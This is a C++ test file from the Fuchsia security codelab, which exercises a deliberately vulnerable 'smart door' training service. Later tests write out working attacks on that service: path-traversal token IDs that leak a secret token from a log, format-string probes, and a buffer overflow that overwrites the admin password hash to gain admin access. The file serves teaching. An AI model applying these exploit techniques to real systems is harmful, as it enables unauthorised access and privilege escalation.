// Copyright 2020 The Fuchsia Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
#include <fuchsia/security/codelabsmartdoor/cpp/fidl.h>

#include "lib/sys/cpp/component_context.h"
#include "src/lib/testing/loop_fixture/test_loop_fixture.h"

namespace securitycodelab {

using fuchsia::security::codelabsmartdoor::Access_AddHomeMember_Result;
using fuchsia::security::codelabsmartdoor::Access_Open_Result;
using fuchsia::security::codelabsmartdoor::AccessResetSyncPtr;
using fuchsia::security::codelabsmartdoor::AccessSyncPtr;
using fuchsia::security::codelabsmartdoor::Error;
using fuchsia::security::codelabsmartdoor::Memory_GenerateToken_Result;
using fuchsia::security::codelabsmartdoor::Memory_GetReader_Result;
using fuchsia::security::codelabsmartdoor::Memory_GetWriter_Result;
using fuchsia::security::codelabsmartdoor::MemoryResetSyncPtr;
using fuchsia::security::codelabsmartdoor::MemorySyncPtr;
using fuchsia::security::codelabsmartdoor::Reader_Read_Result;
using fuchsia::security::codelabsmartdoor::ReaderSyncPtr;
using fuchsia::security::codelabsmartdoor::Token;
using fuchsia::security::codelabsmartdoor::UserGroup;
using fuchsia::security::codelabsmartdoor::Writer_Write_Result;
using fuchsia::security::codelabsmartdoor::WriterSyncPtr;

class SecurityCodelab : public gtest::TestLoopFixture {
 protected:
  void SetUp() override {
    TestLoopFixture::SetUp();
    auto context = sys::ComponentContext::CreateAndServeOutgoingDirectory();
    context->svc()->Connect(smart_door_.NewRequest());
    context->svc()->Connect(smart_door_memory_.NewRequest());

    // Reset the components to their initial state for each test.
    AccessResetSyncPtr smart_door_reset;
    context->svc()->Connect(smart_door_reset.NewRequest());
    smart_door_reset->Reset();
    MemoryResetSyncPtr smart_door_memory_reset;
    context->svc()->Connect(smart_door_memory_reset.NewRequest());
    smart_door_memory_reset->Reset();
  }

  void TearDown() override { TestLoopFixture::TearDown(); }
  AccessSyncPtr smart_door_;
  MemorySyncPtr smart_door_memory_;
  void setTokenID(Token& token);
};

TEST_F(SecurityCodelab, Practice1) {
  Access_AddHomeMember_Result add_result;
  std::vector<uint8_t> password(16, 1u);
  smart_door_->AddHomeMember("user", password, &add_result);
  EXPECT_TRUE(add_result.is_response());

  Access_Open_Result open_result;
  smart_door_->Open("user", password, &open_result);
  EXPECT_TRUE(open_result.is_response());
  EXPECT_EQ(open_result.response().group, UserGroup::REGULAR);
}

TEST_F(SecurityCodelab, Practice2) {
  smart_door_->SetDebugFlag(true);

  Access_AddHomeMember_Result add_result;
  std::vector<uint8_t> password(16, 1u);
  smart_door_->AddHomeMember("user1", password, &add_result);
  EXPECT_TRUE(add_result.is_response());

  Access_Open_Result open_result;
  smart_door_->Open("user1", password, &open_result);
  EXPECT_TRUE(open_result.is_response());
  EXPECT_EQ(open_result.response().group, UserGroup::REGULAR);

  // Open using the wrong password.
  password.push_back(1);
  smart_door_->Open("user1", password, &open_result);
  EXPECT_TRUE(open_result.is_err());

  // Add another user.
  std::vector<uint8_t> password2(16, 2u);
  smart_door_->AddHomeMember("user2", password2, &add_result);
  EXPECT_TRUE(add_result.is_response());

  // Open as the second user.
  smart_door_->Open("user2", password2, &open_result);
  EXPECT_TRUE(open_result.is_response());
  EXPECT_EQ(open_result.response().group, UserGroup::REGULAR);

  // Use the wrong password for user2.
  smart_door_->Open("user2", password, &open_result);
  EXPECT_TRUE(open_result.is_err());

  // Open as a non-existing user.
  smart_door_->Open("user3", password, &open_result);
  EXPECT_TRUE(open_result.is_err());
}

TEST_F(SecurityCodelab, Practice3) {
  Memory_GenerateToken_Result token_result;
  smart_door_memory_->GenerateToken(&token_result);
  EXPECT_TRUE(token_result.is_response());
  auto token = std::move(token_result.response().token);
  WriterSyncPtr writer;
  ReaderSyncPtr reader;

  Token write_token;
  write_token.set_id(token.id());
  Memory_GetWriter_Result get_writer_result;
  smart_door_memory_->GetWriter(std::move(write_token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());

  // Write something into the file.
  Writer_Write_Result write_result;
  std::vector<uint8_t> data(16, 1u);
  writer->Write(data, &write_result);
  EXPECT_TRUE(write_result.is_response());
  EXPECT_EQ(16u, write_result.response().bytes_written);

  // Try to read from a file that has been written to.
  Memory_GetReader_Result get_reader_result;
  Token read_token;
  read_token.set_id(token.id());
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());

  // Read the content out.
  Reader_Read_Result read_result;
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  EXPECT_EQ(data, read_result.response().bytes);
}

TEST_F(SecurityCodelab, Practice4) {
  Token token;
  WriterSyncPtr writer;
  Memory_GetWriter_Result get_writer_result;
  token.set_id("00000000000000000000000000000000");
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());

  token.set_id("gggggggggggggggggggggggggggggggg");
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());

  token.set_id("0000000000000000000000000000000");
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_TRUE(get_writer_result.is_err());
  EXPECT_EQ(get_writer_result.err(), Error::INVALID_INPUT);
}

TEST_F(SecurityCodelab, Practice5) {
  WriterSyncPtr writer;
  ReaderSyncPtr reader;

  Token write_token;
  write_token.set_id("././aaaaaaaaaaaaaaaaaaaaaaaaaaaa");
  Memory_GetWriter_Result get_writer_result;
  smart_door_memory_->GetWriter(std::move(write_token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());

  // Write something into the file.
  Writer_Write_Result write_result;
  std::vector<uint8_t> data(16, 1u);
  writer->Write(data, &write_result);
  EXPECT_TRUE(write_result.is_response());
  EXPECT_EQ(16u, write_result.response().bytes_written);

  // Try to read from a file that has been written to.
  Memory_GetReader_Result get_reader_result;
  Token read_token;
  read_token.set_id("////aaaaaaaaaaaaaaaaaaaaaaaaaaaa");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());

  // Read the content out.
  Reader_Read_Result read_result;
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  EXPECT_EQ(data, read_result.response().bytes);

  read_token.set_id("//aaaaaaaaaaaaaaaaaaaaaaaaaaaa//");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_TRUE(get_reader_result.is_err());

  // Test format string vulnerability.
  write_token.set_id("aaaaaaaaaaaaaaaaaaaaaaaaaaaa%04X");
  smart_door_memory_->GetWriter(std::move(write_token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());
  writer->Write(data, &write_result);
  EXPECT_TRUE(write_result.is_response());
  EXPECT_EQ(16u, write_result.response().bytes_written);

  read_token.set_id("aaaaaaaaaaaaaaaaaaaaaaaaaaaa%04X");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  EXPECT_EQ(data, read_result.response().bytes);

  // Try using the 'formatted' ID to get the reader.
  // token_id is 32 characters long and '\0' at the end.
  char token_id[33] = {0};
  for (size_t i = 0; i < 32; i++) {
    token_id[i] = 'a';
  }
  for (uint16_t i = 0x0000; i < 0xFFFF; i++) {
    sprintf(&token_id[28], "%04X", i);
    read_token.set_id(token_id);
    smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
    // Because there is not format string vulnerability, this should fail.
    EXPECT_TRUE(get_reader_result.is_err());
    EXPECT_EQ(get_reader_result.err(), Error::INVALID_INPUT);
  }
}

TEST_F(SecurityCodelab, Practice6) {
  Memory_GenerateToken_Result token_result;
  smart_door_memory_->GenerateToken(&token_result);
  EXPECT_TRUE(token_result.is_response());
  auto token = std::move(token_result.response().token);
  WriterSyncPtr writer;
  ReaderSyncPtr reader;

  Token write_token;
  write_token.set_id(token.id());
  Memory_GetWriter_Result get_writer_result;
  smart_door_memory_->GetWriter(std::move(write_token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());

  // Write something into the file.
  Writer_Write_Result write_result;
  std::vector<uint8_t> data(16, 1u);
  writer->Write(data, &write_result);
  EXPECT_TRUE(write_result.is_response());
  EXPECT_EQ(16u, write_result.response().bytes_written);

  // Try to read from the log file.
  Memory_GetReader_Result get_reader_result;
  Token read_token;
  read_token.set_id("/////////////////////////////log");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_TRUE(get_reader_result.is_err());

  // Try to read from log file at the upper level.
  read_token.set_id("..///////////////////////////log");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());

  // Read the content out.
  Reader_Read_Result read_result;
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  auto bytes = read_result.response().bytes;
  for (size_t i = 0; i < bytes.size(); i++) {
    printf("%c", bytes.data()[i]);
  }
  printf("\n");
}

TEST_F(SecurityCodelab, Practice7) {
  smart_door_->SetDebugFlag(true);
  Token token;
  setTokenID(token);
  ReaderSyncPtr reader;
  Memory_GetReader_Result get_reader_result;
  smart_door_memory_->GetReader(std::move(token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());
  Reader_Read_Result read_result;
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  auto bytes = read_result.response().bytes;
  for (size_t i = 0; i < bytes.size(); i++) {
    printf("%02x", bytes.data()[i]);
  }
  printf("\n");

  // Open using the wrong password to generate password matching logs.
  Access_Open_Result open_result;
  std::vector<uint8_t> password;
  smart_door_->Open("testuser", password, &open_result);
  EXPECT_TRUE(open_result.is_err());
}

TEST_F(SecurityCodelab, Practice8) {
  smart_door_->SetDebugFlag(true);
  Token token;
  setTokenID(token);
  WriterSyncPtr writer;
  Memory_GetWriter_Result get_writer_result;
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());
  Writer_Write_Result write_result;
  std::vector<uint8_t> write_buffer(57, 0u);
  write_buffer[0] = 33;
  writer->Write(write_buffer, &write_result);
  EXPECT_FALSE(write_result.is_err());
  Access_Open_Result open_result;
  std::vector<uint8_t> password(16, 1u);
  smart_door_->Open("testuser", password, &open_result);
  EXPECT_TRUE(open_result.is_err());

  write_buffer[0] = 255;
  writer->Write(write_buffer, &write_result);
  EXPECT_FALSE(write_result.is_err());
  smart_door_->Open("testuser", password, &open_result);
  EXPECT_TRUE(open_result.is_err());
}

TEST_F(SecurityCodelab, Practice9) {
  smart_door_->SetDebugFlag(true);
  Token token;
  setTokenID(token);
  WriterSyncPtr writer;
  Memory_GetWriter_Result get_writer_result;
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());
  Writer_Write_Result write_result;
  std::vector<uint8_t> write_buffer(1024, 0u);

  write_buffer[0] = 255;
  // For x64
  const size_t overflow_size = 32;
  // // For arm64.
  // const size_t overflow_size = 32 + 16;

  for (size_t i = 1 + overflow_size; i < 1 + overflow_size + 32; i++) {
    write_buffer[i] = 0x11;
  }
  writer->Write(write_buffer, &write_result);
  EXPECT_FALSE(write_result.is_err());

  Access_Open_Result open_result;
  std::vector<uint8_t> password(16, 1u);
  smart_door_->Open("testuser", password, &open_result);
  EXPECT_TRUE(open_result.is_err());
}

TEST_F(SecurityCodelab, Practice10) {
  smart_door_->SetDebugFlag(true);

  Token token;
  setTokenID(token);

  // Set up buffer for test.
  uint8_t buffer[1024] = {};
  // Set the name_size to be 255, this would overflow.
  *(uint8_t*)buffer = 255;
  // Fill the user_name buffer with 0, the rest should overflow.
  // This value varies by arm64 and x64. The value here is for arm64.
  // For arm64, we need 32 bytes to fill the user_name buffer, another 16 bytes to overwrite salt.
  // For x64 this value need to be 32 because the admin_hash is placed directly after user name
  // buffer.

  // // For arm64.
  // const size_t overflow_size = 32 + 16;

  // // Fill the hash for arm64. This is the hash for ["password" + 16 bytes 0] since we would
  // // overwrite the admin salt with 0s.
  // uint8_t test_hash[32] = {0x26, 0xfa, 0x8f, 0xe1, 0x29, 0x75, 0xef, 0xe5, 0x73, 0x61,
  //                          0x99, 0x9e, 0xb2, 0x6b, 0x3a, 0xba, 0x7f, 0xb2, 0x05, 0xaa,
  //                          0x90, 0xba, 0x8c, 0x10, 0x8f, 0x48, 0x69, 0xd8, 0xd0, 0x3a,
  //                          0x21, 0x30};

  // For x64
  const size_t overflow_size = 32;

  // Fill the hash for x64. x64 compiled code somehow placed the admin salt before the buffer
  // that we could overflow, as a result, we are not able to modify the salt. luckily, we could read
  // out the admin salt using the debug log. This value is the hash for ["password" + admin_salt].
  //
  uint8_t test_hash[32] = {0x7e, 0xca, 0x49, 0xec, 0xc8, 0x28, 0xf0, 0x4b, 0x5a, 0x3c, 0xa2,
                           0xaa, 0x3d, 0x57, 0x8a, 0x15, 0xf3, 0x5c, 0xad, 0x73, 0xf9, 0x0d,
                           0x7f, 0x7b, 0x59, 0x5b, 0x76, 0xe2, 0xbe, 0x7d, 0x3c, 0x24};

  memcpy(buffer + 1 + overflow_size, test_hash, 32);
  std::vector<uint8_t> write_buffer;
  write_buffer.insert(write_buffer.end(), buffer, buffer + 1024);

  Memory_GetWriter_Result get_writer_result;
  WriterSyncPtr writer;
  smart_door_memory_->GetWriter(std::move(token), writer.NewRequest(), &get_writer_result);
  EXPECT_FALSE(get_writer_result.is_err());
  Writer_Write_Result write_result;
  writer->Write(write_buffer, &write_result);
  EXPECT_TRUE(write_result.is_response());
  EXPECT_EQ(write_buffer.size(), write_result.response().bytes_written);

  Access_Open_Result open_result;
  std::vector<uint8_t> password;
  const char* test_admin_password = "password";
  password.insert(password.end(), test_admin_password,
                  test_admin_password + strlen(test_admin_password));
  smart_door_->Open("admin", password, &open_result);
  EXPECT_TRUE(open_result.is_response());
  EXPECT_EQ(open_result.response().group, UserGroup::ADMIN);
}

void SecurityCodelab::setTokenID(Token& token) {
  // Add a user so that smart-door would write to smart-door-memory.
  Access_AddHomeMember_Result add_result;
  std::vector<uint8_t> password(16, 1u);
  smart_door_->AddHomeMember("testuser", password, &add_result);
  EXPECT_TRUE(add_result.is_response());

  // Try to read from the log file to get the secret token.
  ReaderSyncPtr reader;
  Memory_GetReader_Result get_reader_result;
  Token read_token;
  // Need to make the ID 32 chars long.
  read_token.set_id("..///////////////////////////log");
  smart_door_memory_->GetReader(std::move(read_token), reader.NewRequest(), &get_reader_result);
  EXPECT_FALSE(get_reader_result.is_err());

  Reader_Read_Result read_result;
  reader->Read(&read_result);
  EXPECT_TRUE(read_result.is_response());
  auto bytes = read_result.response().bytes;
  std::string log_content(bytes.begin(), bytes.end());

  // By parsing the log file, we can see the token is the file name.
  size_t pos = log_content.find("/data/storage/", 0) + strlen("/data/storage/");
  EXPECT_TRUE(pos + 32 < log_content.size());
  std::string id = log_content.substr(pos, 32);
  token.set_id(id);
}

}  // namespace securitycodelab
